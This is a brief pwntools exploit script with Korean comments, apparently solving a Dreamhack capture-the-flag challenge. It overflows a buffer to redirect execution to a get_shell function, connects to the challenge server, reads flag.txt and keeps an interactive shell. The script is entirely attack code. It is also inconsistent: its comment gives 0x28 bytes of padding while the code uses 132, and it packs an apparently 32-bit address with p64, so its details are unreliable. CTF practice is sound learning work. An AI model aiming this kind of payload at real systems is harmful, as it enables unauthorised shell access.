from pwn import *

# get_shell 함수 주소. gdb로 찾은 실제 주소로 변경해야 합니다.
get_shell_addr = 0x080485b9

# 'A' * 0x28 뒤에 get_shell 함수 주소를 little-endian으로 변환하여 추가합니다.
payload = b'A' * 132 + p64(get_shell_addr)

# 원격 서버에 연결합니다.
p = remote('host1.dreamhack.games', 15721)

# 생성한 payload를 전송합니다.
p.sendline(payload)

# 'cat flag.txt' 명령을 전송합니다.
p.sendline('cat flag.txt')

# 서버의 응답을 받아서 출력합니다.
print(p.recv().decode('utf-8'))

# 대화형 모드로 전환하여 쉘을 유지합니다.
p.interactive()
